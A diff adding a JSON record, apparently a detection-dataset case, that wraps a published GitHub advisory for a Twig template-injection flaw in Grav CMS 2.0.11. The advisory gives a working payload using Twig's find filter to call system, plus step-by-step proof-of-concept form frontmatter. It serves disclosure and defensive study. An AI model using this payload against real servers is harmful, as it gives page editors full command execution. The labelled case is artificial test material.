@@ -1,0 +1,156 @@
+{
+  "adjudication": {
+    "admission_output_used": false,
+    "basis": "source_observation",
+    "corpus_v1_evidence_used": false,
+    "corpus_v1_labels_used": false,
+    "corpus_v1_scores_used": false,
+    "detector_output_used": false,
+    "expected_condition_signals": [],
+    "notes": "Partial public-source metadata only; intentionally insufficient as a positive condition.",
+    "ranking_output_used": false,
+    "v6_first_blind_case_errors_used": false,
+    "v6_first_blind_score_used": false
+  },
+  "capture_method": "passive_source_snapshot",
+  "capture_reference": "https://github.com/getgrav/grav/security/advisories/GHSA-xx48-97m4-h7qm",
+  "captured_at": "2026-08-14T18:58:04.418653+00:00",
+  "case_kind": "sparse_noisy",
+  "collector": {
+    "kind": "v7_public_source_literal_draft",
+    "target_contact_performed": false,
+    "third_party_code_executed": false,
+    "version": "1.0.0"
+  },
+  "family": "server_side_template_injection",
+  "raw": {
+    "details": {
+      "observation_kind": "partial_public_source_metadata",
+      "source_project": "getgrav/grav",
+      "version_boundaries": [
+        {
+          "ecosystem": "",
+          "package": "grav + grav-plugin-email",
+          "patched_version": "2.0.13",
+          "vulnerable_version_range": "2.0.11"
+        }
+      ],
+      "version_boundary_count": 1
+    },
+    "method": "UNKNOWN"
+  },
+  "source_project": "getgrav/grav",
+  "source_root": "GHSA-4jrc-qc5x-3wrr",
+  "source_snapshot": {
+    "payload": {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "Kuba0123",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/72563621?v=4",
+            "events_url": "https://api.github.com/users/Kuba0123/events{/privacy}",
+            "followers_url": "https://api.github.com/users/Kuba0123/followers",
+            "following_url": "https://api.github.com/users/Kuba0123/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Kuba0123/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/Kuba0123",
+            "id": 72563621,
+            "login": "Kuba0123",
+            "node_id": "MDQ6VXNlcjcyNTYzNjIx",
+            "organizations_url": "https://api.github.com/users/Kuba0123/orgs",
+            "received_events_url": "https://api.github.com/users/Kuba0123/received_events",
+            "repos_url": "https://api.github.com/users/Kuba0123/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/Kuba0123/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Kuba0123/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/Kuba0123",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": null,
+          "vector_string": null
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [],
+      "cwes": [],
+      "description": "### Summary\r\n\r\nA low-privileged page editor (any account that can create or edit a page) can execute arbitrary operating-system commands on the server. Grav sandboxes Twig in normal editor content, but a form's email-action parameters (subject, body, to, from) are rendered as Twig with the sandbox turned off. An editor puts a Twig payload in the email subject; the command runs whenever the form is submitted (by anyone, including an anonymous visitor), and even when no working mail server is configured, because it fires while the message is being built. This is full server takeover from a restricted role.\r\n\r\n### Details\r\n\r\nGrav intentionally stops non-super editors from running arbitrary Twig. Two mechanisms normally enforce that:\r\n\r\n- The Twig sandbox is enabled only for editor-controlled sources. The source policy in `system/src/Grav/Common/Twig/Sandbox/GravSourcePolicy.php` turns the sandbox on only for template names starting with `@Page:` or `@Var:`:\r\n\r\n  ```php\r\n  return str_starts_with($name, '@Page:') || str_starts_with($name, '@Var:');\r\n  ```\r\n\r\n- Grav also replaces the `filter`, `map` and `reduce` Twig filters with hardened versions that reject dangerous callables regardless of the sandbox. See `system/src/Grav/Common/Twig/Extension/GravExtension.php` (registrations around lines 182-184, guard `Utils::isDangerousFunction($arrow)`), e.g.:\r\n\r\n  ```php\r\n  if (!$arrow instanceof \\Closure && !is_string($arrow) || Utils::isDangerousFunction($arrow)) {\r\n      throw new RuntimeError('Twig |map(\"' . $arrow . '\") is not allowed.');\r\n  }\r\n  ```\r\n\r\nTwo gaps combine into RCE:\r\n\r\n1. Email-action parameters are rendered as UNSANDBOXED Twig. The Email plugin renders each param through `processTwigString()` in `user/plugins/email/classes/Email.php` (around line 416), which registers the string under a template name prefixed `@EmailVar:`:\r\n\r\n   ```php\r\n   $name = '@EmailVar:' . md5($string);\r\n   ...\r\n   return $twig->twig->render($name, $vars);\r\n   ```\r\n\r\n   Because `@EmailVar:` is neither `@Page:` nor `@Var:`, the source policy above does NOT enable the sandbox for it. So these strings run with the full Twig surface. This path is reached from `buildMessage()` -> `processParams()` (around line 204/389) while the message is assembled, before any send.\r\n\r\n2. The `find` filter is not one of the filters Grav hardens. `filter`, `map` and `reduce` are overridden and always reject dangerous functions, but `find` falls through to Twig core's `find`, which only blocks callables when the sandbox is active. In the unsandboxed `@EmailVar:` render the sandbox is off, so `find` happily calls a string function such as `system`.\r\n\r\nExploit primitive:\r\n\r\n```twig\r\n{{ ['id > /tmp/pwned 2>&1']|find('system') }}\r\n```\r\n\r\n`find` calls `system('id > /tmp/pwned 2>&1')` as its test callback, running the command. It must be `find` (not `map`/`filter`, which Grav blocks). The Email plugin is active in a default install (its engine defaults to sendmail), and the command runs during message build, so no reachable mail server is required.\r\n\r\n### PoC\r\n\r\n1. Log in to the admin panel (you can use the admin account, or any account that can edit pages).\r\n\r\n2. Create a new page using the Form page template. Edit the created page in expert mode and put the following payload into the Frontmatter field:\r\n\r\n   ```yaml\r\n   title: Contact\r\n   form:\r\n       name: rceform\r\n       fields:\r\n           - name: email\r\n             type: text\r\n       process:\r\n           - email:\r\n               from: x@x.com\r\n               to: x@x.com\r\n               subject: \"{{ ['id > /tmp/pwned 2>&1']|find('system') }}\"\r\n               body: hi\r\n           - message: Thanks\r\n   ```\r\n\r\n3. Save the page. Note its address, for example http://localhost:8000/contact.\r\n\r\n4. Open that page in a browser. You will see a small form with one field.\r\n\r\n5. Fill in anything and press Enter.\r\n\r\n6. The command has now run on the server. In this example, `/tmp/pwned` now contains the output of the `id` command.\r\n\r\n### Impact\r\n\r\nUnsandboxed-Twig / template-injection leading to remote code execution.\r\n\r\n- Who can exploit it: any account with page-edit rights — the exact restricted \"editor\" role Grav's Twig sandbox is meant to contain. It escalates that role into arbitrary command execution and full server compromise.\r\n- Who is affected: the server and everything on it. The command runs with the web server's privileges. Triggering only needs someone to submit the form, which can be the attacker themselves or any anonymous visitor.\r\n\r\nSuggested fix: render email-action parameters through the same sandboxed Twig path used for other editor content (so `@EmailVar:` is sandboxed), and/or harden the `find` filter the same way `map`/`filter`/`reduce` are hardened so it cannot invoke dangerous functions.\r\n",
+      "ghsa_id": "GHSA-xx48-97m4-h7qm",
+      "html_url": "https://github.com/getgrav/grav/security/advisories/GHSA-xx48-97m4-h7qm",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-xx48-97m4-h7qm"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-07-26T12:56:38Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/1084697?v=4",
+        "events_url": "https://api.github.com/users/rhukster/events{/privacy}",
+        "followers_url": "https://api.github.com/users/rhukster/followers",
+        "following_url": "https://api.github.com/users/rhukster/following{/other_user}",
+        "gists_url": "https://api.github.com/users/rhukster/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/rhukster",
+        "id": 1084697,
+        "login": "rhukster",
+        "node_id": "MDQ6VXNlcjEwODQ2OTc=",
+        "organizations_url": "https://api.github.com/users/rhukster/orgs",
+        "received_events_url": "https://api.github.com/users/rhukster/received_events",
+        "repos_url": "https://api.github.com/users/rhukster/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/rhukster/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/rhukster/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/rhukster",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Remote code execution via Twig Server-side template injection in Grav CMS 2.0.11",
+      "updated_at": "2026-07-26T12:56:38Z",
+      "url": "https://api.github.com/repos/getgrav/grav/security-advisories/GHSA-xx48-97m4-h7qm",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "",
+            "name": "grav + grav-plugin-email"
+          },
+          "patched_versions": "2.0.13",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "2.0.11"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/getgrav/grav/security/advisories/GHSA-xx48-97m4-h7qm",
+    "retrieved_at": "2026-08-14T18:58:04.418658+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
